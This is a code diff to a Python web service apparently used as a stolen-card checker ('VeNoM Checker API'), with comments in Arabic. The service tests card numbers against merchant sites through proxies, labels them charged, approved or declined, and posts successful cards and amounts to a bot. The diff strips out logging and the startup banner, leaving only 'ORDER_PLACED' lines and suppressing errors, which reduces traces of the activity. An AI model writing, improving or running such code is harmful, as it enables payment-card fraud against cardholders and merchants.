@@ -38,16 +38,22 @@ except ImportError:
     _MEMORY_CHECK = False
 
 # ══════════════════════════════════════════════════════════════
+#  Logging — مقفول تماماً، بيظهر بس ORDER_PLACED
+# ══════════════════════════════════════════════════════════════
+logging.basicConfig(level=logging.CRITICAL, format="%(message)s",
+                    handlers=[logging.StreamHandler()])
+logging.getLogger("uvicorn").setLevel(logging.CRITICAL)
+logging.getLogger("uvicorn.access").setLevel(logging.CRITICAL)
+logging.getLogger("uvicorn.error").setLevel(logging.CRITICAL)
+_log = logging.getLogger("main")
+_log.setLevel(logging.CRITICAL)
+
+# ══════════════════════════════════════════════════════════════
 #  Config
 # ══════════════════════════════════════════════════════════════
 PORT             = int(os.environ.get("CHECKER_PORT", os.environ.get("PORT", "6767")))
 REQUEST_TIMEOUT  = 90
 MEMORY_LIMIT_PCT = 90
-
-logging.basicConfig(level=logging.CRITICAL, format="%(message)s",
-                    handlers=[logging.StreamHandler()])
-_log = logging.getLogger("main")
-_log.setLevel(logging.CRITICAL)
 
 # ══════════════════════════════════════════════════════════════
 #  Dead-site cache
@@ -185,12 +191,11 @@ async def _send_to_bot(
     try:
         async with httpx.AsyncClient(timeout=10) as client:
             resp = await client.post(url, json=payload)
-            if resp.status_code != 200:
-                _log.warning("Bot send failed [%s]: %s", resp.status_code, resp.text[:200])
-            else:
-                _log.info("Bot sent OK: %s", card)
-    except Exception as e:
-        _log.warning("Bot send error: %s", e)
+            if resp.status_code == 200:
+                _log.warning("✅ %s|ORDER_PLACED|$%s", card, amount)
+            # لو فشل الإرسال، مفيش log
+    except Exception:
+        pass
 
 
 # ══════════════════════════════════════════════════════════════
@@ -224,19 +229,14 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
     status     = status_map.get(res.status, "error")
     result_str = res.status_code or _exc_text(res.error) or "UNKNOWN"
 
-    # كشف PROCESSING قبل normalize
     is_processing = (result_str or "").upper() == "PROCESSING"
 
     status, result_str = normalize_result(status, result_str)
 
-    # لو PROCESSING → متعملهوش mark_dead (مش موقع ميت، محاولة)
     if status == "error" and not is_processing:
         _mark_dead(site, result_str)
 
-    if status in ("charged", "approved", "declined"):
-        _log.info("%s|%s", cc, result_str)
-    elif is_processing:
-        _log.info("%s|PROCESSING (retry)", cc)
+    # ✅ مفيش أي log هنا — بس ORDER_PLACED
 
     return {
         "status":      status,
@@ -318,7 +318,6 @@ async def route_check(
     site:  Optional[str] = Query(None),
     proxy: Optional[str] = Query(None),
 ):
-    # فحص الذاكرة أولاً
     if _is_memory_exceeded():
         return JSONResponse({"error": "Server is busy"}, status_code=503)
 
@@ -348,7 +347,6 @@ async def route_check(
     except asyncio.TimeoutError:
         _stats["errors"] += 1
         _stats["active"] -= 1
-        _log.info("%s|Timeout", cc)
         return JSONResponse({
             "Status":  "SiteError",
             "Response": "Timeout",
@@ -362,7 +360,6 @@ async def route_check(
     except Exception as e:
         _stats["errors"] += 1
         _stats["active"] -= 1
-        _log.info("%s|%s", cc, str(e)[:80])
         return JSONResponse({
             "Status":  "SiteError",
             "Response": str(e)[:150],
@@ -377,13 +374,10 @@ async def route_check(
     elapsed     = round(time.monotonic() - t0, 2)
     card_status = result.get("status", "error")
 
-    # لو PROCESSING → متسجلهوش في errors
     is_retry = bool(result.get("retry", False))
 
     if is_retry:
-        # محاولة → مش بتتحسب في stats
         _stats["active"] -= 1
-        _log.info("%s|RETRY:%s", cc, result.get("result", "PROCESSING"))
         return JSONResponse({
             "Status":      "SiteError",
             "Response":    result.get("result", "PROCESSING"),
@@ -427,7 +421,6 @@ async def route_check(
     elif card_status == "approved" and "3DS" in _result_str.upper():
         _result_str = "3DS_REQUIRED"
 
-    # البوابة الأصلية
     gateway = result.get("gateway") or "VeNoM"
 
     return JSONResponse({
@@ -451,22 +444,7 @@ if __name__ == "__main__":
     cpu_count = multiprocessing.cpu_count()
     workers   = max(1, cpu_count)
 
-    # uvloop مش بيشتغل على Windows
     loop_type = "uvloop" if sys.platform != "win32" else "asyncio"
-
-    print("━" * 50)
-    print("  VeNoM Checker API — TURBO MODE")
-    print(f"  Port         : {PORT}")
-    print(f"  Workers      : {workers}  (1 per CPU)")
-    print(f"  Endpoint     : /VeNoM")
-    print(f"  Status       : /VeNoMs")
-    print(f"  Loop         : {loop_type}")
-    print(f"  Timeout      : {REQUEST_TIMEOUT}s")
-    print(f"  Bot Enabled  : {BOT_ENABLED}")
-    print(f"  Bot Chat ID  : {'SET' if BOT_CHAT_ID else '(not set)'}")
-    print(f"  Bot Token    : {'SET' if BOT_TOKEN else '(not set)'}")
-    print("━" * 50)
-    print("━" * 50)
 
     uvicorn.run(
         "main:app",
@@ -475,6 +453,7 @@ if __name__ == "__main__":
         loop=loop_type,
         workers=workers,
         access_log=False,
+        log_level="critical",
         backlog=4096,
         timeout_keep_alive=55,
         limit_max_requests=None,
